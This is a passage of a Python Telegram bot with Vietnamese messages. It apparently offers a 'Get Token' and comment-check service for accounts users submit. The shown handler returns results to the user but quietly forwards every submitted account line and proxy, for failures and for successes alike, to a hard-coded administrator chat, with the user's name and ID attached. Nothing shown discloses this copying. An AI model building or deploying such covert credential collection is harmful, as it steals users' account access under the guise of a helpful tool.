            f"❌ `UID: {res.get('uid', 'Unknown')}` | Lỗi:"
            f" {res.get('error', 'Lỗi')}\n\n"
        )
        try:
          admin_err_msg = (
              f"⚠️ **GET TOKEN THẤT BẠI**\n👤 User: {username_str}"
              f" (`{user.id}`)\n📂 Tài khoản: `{res['acc_line']}`\n🌐 Proxy:"
              f" `{res['proxy'] if res['proxy'] else 'Không dùng'}`\n❌ Lỗi:"
              f" {res.get('error')}"
          )
          await context.bot.send_message(
              chat_id=ADMIN_TELEGRAM_ID,
              text=admin_err_msg,
              parse_mode="Markdown",
          )
        except:
          pass

  if successful_accounts:
    try:
      await context.bot.send_message(
          chat_id=ADMIN_TELEGRAM_ID,
          text=f"👤 **Người dùng:** {username_str} (`{user.id}`)",
          parse_mode="Markdown",
      )
      msg2 = "📂 **Thành công:**\n" + "\n".join(
          [f"`{acc}`" for acc in successful_accounts]
      )
      await context.bot.send_message(
          chat_id=ADMIN_TELEGRAM_ID, text=msg2, parse_mode="Markdown"
      )
    except:
      pass

  if len(results_text) > 4000:
    for x in range(0, len(results_text), 4000):
      await context.bot.send_message(
          chat_id=user_id, text=results_text[x : x + 4000], parse_mode="Markdown"
      )
  else:
    if update.message:
      await update.message.reply_text(results_text, parse_mode="Markdown")
    elif update.callback_query:
      await update.callback_query.message.reply_text(
          results_text, parse_mode="Markdown"
      )


def main():
  app = ApplicationBuilder().token(TELEGRAM_BOT_TOKEN).build()

  app.add_handler(CommandHandler("start", start))
  app.add_handler(CommandHandler("admin", admin_command))
  app.add_handler(CallbackQueryHandler(button_callback))
  app.add_handler(
      MessageHandler(
          filters.TEXT & (~filters.COMMAND) | filters.Document.ALL,
          handle_message,
      )
  )

  print("🤖 Bot Telegram đã sẵn sàng hoạt động (Get Token + Check Cmt)...")
  app.run_polling()


if __name__ == "__main__":
  flask_thread = threading.Thread(target=run_flask)
  flask_thread.daemon = True
  flask_thread.start()

  main()
